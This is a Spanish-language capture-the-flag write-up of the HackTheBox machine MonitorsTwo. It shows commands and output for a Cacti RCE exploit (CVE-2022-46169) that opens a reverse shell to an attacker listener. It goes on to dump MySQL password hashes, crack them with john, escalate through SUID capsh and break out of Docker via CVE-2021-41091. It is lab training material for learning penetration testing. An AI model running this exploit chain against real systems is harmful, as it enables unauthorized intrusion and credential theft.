---
title: HackTheBox - MonitorsTwo
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'RCE (CVE-2022-46169)', 'Docker Breakout (CVE-2021-41091)']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/MonitorsTwo/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: MonitorsTwo Machine Logo
---

Máquina Linux de nivel **Easy** de HackThBox.

Técnicas usadas: **RCE (CVE-2022-46169), Docker Breakout (CVE-2021-41091)**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos en la **Máquina MonitorsTwo**

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/MonitorsTwo/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p22,80 -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/MonitorsTwo/02-versions.png)

c. Vemos el servicio web de la página web

![](/assets/images/HTB/Easy/MonitorsTwo/03-web.png)

* Si buscamos por alguna vulnerabilidad del servicio **cacti 1.2.22** nos encontramos con [CVE-2022-46169](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/blob/main/CVE-2022-46169.py)

* Nos ponemos en escucha con **nc**, y ejecutamos el script


    ```bash
    root@kali> python exploit.py -u http://10.10.11.211/ --LHOST=10.10.14.174 --LPORT=443
    --------------------------------------------------------------------------------------
    root@kali> nc -lvnp 443
    www-data@50bca5e748b0:/var/www/html$
    ```

### Escalada de Privilegios 💹

a. Estamos en un contenedor

```bash
www-data@50bca5e748b0:/var/www/html$ hostname -I
172.19.0.3
```

* Vemos el fichero **entrypoint.sh** en la raíz del sistema

    ```bash
    www-data@50bca5e748b0:/$ cat entrypoint.sh

    mysql --host=db --user=root --password=root cacti
    <SNIP>
    ```

* Con la cadena conexión de mysql nos conectamos a este servicio y lo inspeccionamos

    ```bash
    www-data@50bca5e748b0:/$ mysql --host=db --user=root --password=root

    MySQL [(none)]> show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | cacti   <---       |
    | mysql              |
    | performance_schema |
    | sys                |
    +--------------------+
    5 rows in set (0.002 sec)

    MySQL [(none)]> use cacti;
    MySQL [(none)]> show tables;

    <SNIP>
    | user_auth          |
    <SNIP>
    MySQL [cacti]> select username, password from user_auth;
    +----------+--------------------------------------------------------------+
    | username | password                                                     |
    +----------+--------------------------------------------------------------+
    | admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
    | guest    | 43e9a4ab75570f5b                                             |
    | marcus   | $2y$10$vcrYth5Y[SNIP]                                        |
    +----------+--------------------------------------------------------------+
    ```

b. Crackeamos los hashes de **admin** y **marcus** con john

```bash
root@kali> john hashes.txt -w=/usr/share/wordlists/rockyou.txt
<Hash marcus>:f[SNIP]y
```

c. Estas credenciales nos sirven para autenticarnos en el servicio **`SSH`**

```bash
root@kali> ssh marcus@10.10.11.211
marcus@monitorstwo:~$
```

* Después de inspeccionar todo el sistema en busca de formas de escalar privilegios nos encontramos con este mensaje

    ```bash
    marcus@monitorstwo:~$ cat /var/mail/marcus

    From: administrator@monitorstwo.htb
    To: all@monitorstwo.htb

    CVE-2021-33033: This vulnerability <SNIP>
    CVE-2020-25706: This cross-site scripting <SNIP>
    CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization.<SNIP>
    ```

* La vulnerabilidad que más nos llama la atención es **`CVE-2021-41091`** ya que implica el uso de Docker. Al buscar un exploit con ese CVE con encontramos con [esto](https://github.com/UncleJ4ck/CVE-2021-41091), para que este script funcione debemos darle permiso **SUID** a la bash de un contenedor


d. Buscaremos formas de escalar privilegios en el contenedor

```bash
www-data@50bca5e748b0:/var/www/html$ find / -perm -4000 2>/dev/null
<SNIP>
/sbin/capsh
```

* En [gtfobins](https://gtfobins.github.io/gtfobins/capsh/#suid) encontramos una forma, y le daremos permiso SUID a la bash

    ```bash
    www-data@50bca5e748b0:/var/www/html$ capsh --gid=0 --uid=0 --
    root@50bca5e748b0:/var/www/html# chmod +s /bin/bash
    ```

e. Por último ejecutamos el [script](https://github.com/UncleJ4ck/CVE-2021-41091) y conseguiremos acceso como root

```bash
marcus@monitorstwo:/tmp$ ./exploit.sh

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes

[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didnt spawn a shell go to this path and execute './bin/bash -p'

marcus@monitorstwo:/tmp$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
bash-5.1# whoami
root
```